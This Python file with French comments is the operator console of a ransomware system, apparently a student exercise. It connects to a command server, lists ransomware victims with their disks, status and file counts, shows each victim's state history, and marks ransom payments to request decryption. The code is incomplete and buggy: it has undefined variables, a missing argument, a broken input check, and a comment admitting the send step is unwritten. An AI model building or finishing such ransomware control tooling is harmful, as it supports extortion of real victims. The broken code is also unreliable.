from ..utile import network as net
from ..utile import message as mess



def choix_victime(new_data_victimes):
    # Demande du numéro de la victime
    nb_victime = len(new_data_victimes)
    num_victime = int(input("Entrez le numéro de la victime (de 1 à 4):"))

    # Vérification de l'input de l'utilisateur
    while 1 > num_victime > nb_victime:
        print(f"Erreur: veuillez entrer un nombre entre 1 et {nb_victime}")
        num_victime = int(input(f"Entrez le numéro de la victime (entre 1 et : {nb_victime}"))

    return num_victime

def choix_action():
    """Cette fonction, lorsqu'elle est appelée, affiche un menu et demande à l'utilisateur d'entrer le choix correspondant.
    Elle retourne un entier entre 1 et 4 qui est le choix de la personne."""

    menu = "CONSOLE DE CONTRÔLE\n===================\n1) Liste des victimes du ransomware\n2) Historique des états d'une victime\n3) Renseigner le payement de rançon d'une victime\n4) Quitter\nVotre choix: "
    choix = int(input(menu))

    #Vérifie que le choix entré est bien entre 1 et 4
    while choix > 4 or choix < 1:
        print("-----------------------------------------")
        print("Veuillez entrer un chiffre entre 1 et 4!")
        print("-----------------------------------------")
        choix = int(input(menu))

    return choix

def afficher_liste_victime(new_data_victimes):

    print("LISTING DES VICTIMES DU RANSOMWARE")
    print("___________________________________")
    print("num  id             type        disques        statut     nb. de fichiers")

    #Affichage des victimes avec un format + ajout d'un numéro pour chaque victime
    form = "{0:5}{1:15}{2:12}{3:15}{4:11}{5:30}"
    for i, val in enumerate(new_data_victimes):
        val.insert(0, str(i + 1))
        print(form.format(*val))

    return

def afficher_historique_victime(new_data_victimes):

    victime = choix_victime(new_data_victimes)

    #Récupération de l'id de la victime grâce au num que l'utilisateur à entré
    for i in new_data_victimes:
        if i[0] == str(victime):
            id_victime = int(i[1])

    #Appel de la fonction qui retournera les infos de la victime précise grâce à l'id
    data_victimes = data.recup_data_victime(2,id_victime)

    print("HISTORIQUE DES ETATS D'UNE VICTIME")
    print("___________________________________")


    form = "{0:11}{1:9} - {2:14} - {3:20}"
    for val in data_victimes:
        print(form.format(*val))

    return

def afficher_rancon_victime(new_data_victimes):

    print("VALIDER LE PAIEMENT DE RANCON D'UNE VICTIME")
    print("____________________________________________")

    num_victime = choix_victime(new_data_victimes)
    victime = new_data_victimes[num_victime-1]
    etat_victime = str.upper(victime[8])

    while etat_victime == 'INITIALIZE' or etat_victime == 'PROTECTED':
        print(f"ERREUR : La victime {num_victime} {victime[1]} est en mode {etat_victime}!")
        num_victime = choix_victime(new_data_victimes)
        victime = new_data_victimes[num_victime - 1]
        etat_victime = str.upper(victime[8])

    choix = str.upper(input(f"Confirmez la demande de déchiffrement pour la victime {num_victime} {victime[1]} (O/N):"))

    if choix == 'O':

        #Ici je suis censée envoyer un truc mais jsp comment ni avec quoi :/

        print("La demande est transmise !")
    else:
        print("La demande ne sera pas transmise.")

    return


if __name__ == "__main__":

    # Connexion au serveur
    serv = net.connect_to_serv()

    # Variable qui s'occupera de vérifier si l'utilisateur à bien fait le choix 1 avant de pouvoir faire tous les autres
    ordre_choix = False

    # Affiche une première fois le menu et stocke le choix
    num_choix = choix_action()

    # Boucle tant que l'utilisateur ne choisi pas le quatrième choix (quitter)
    while num_choix != 4:

        # Premier choix:
        if num_choix == 1:

            # On change la valeur de la variable puisque l'utilisateur a fait le premier choix
            ordre_choix = True
            # Envoie au serveur la requête de liste des victimes
            net.send_message(serv,mess.set_message('LIST_VICTIMS_REQ'))
            # Création d'une liste vide qui contiendra la liste des victimes et d'une variable temp pour pouvoir boucler sur la boucle while d'en dessous
            liste_victime = []
            temp = True
            # Boucle qui ajoute les victimes dans la liste "liste_victimes"
            while temp:
                victime = net.receive_message(serv)
                if mess.set_message(victime) == 'LIST_VICTIM_RESP':
                    liste_victime.append(victime)
                    continue
                elif mess.set_message(victime) == 'LIST_VICTIM_END':
                    temp = False

            # A partir de data_victimes, création d'une nouvelle liste de listes (et plus de tuple) avec les infos des victimes
            #new_data_choix1 = []
            #for val in data_choix1:
                #new_data_choix1.append(list(val))

            afficher_liste_victime(liste_victime)

        # Deuxième choix, ne s'affiche QUE si l'utilisateur a déjà fait le choix 1 avant, sinon affiche une erreur:
        elif num_choix == 2:

            if ordre_choix:
                afficher_historique_victime(new_data_victimes)
            else:
                print("\nERREUR : Veuillez d'abord lister les victimes!\n")

        # Troisième choix, ne s'affiche QUE si l'utilisateur a déjà fait le choix 1 avant, sinon affiche une erreur:
        elif num_choix == 3:

            if ordre_choix:
                afficher_rancon_victime()
            else:
                print("\nERREUR : Veuillez d'abord lister les victimes!\n")


        num_choix = choix_action()

    # Ferme la fenêtre lorsque le choix est 4
    exit()



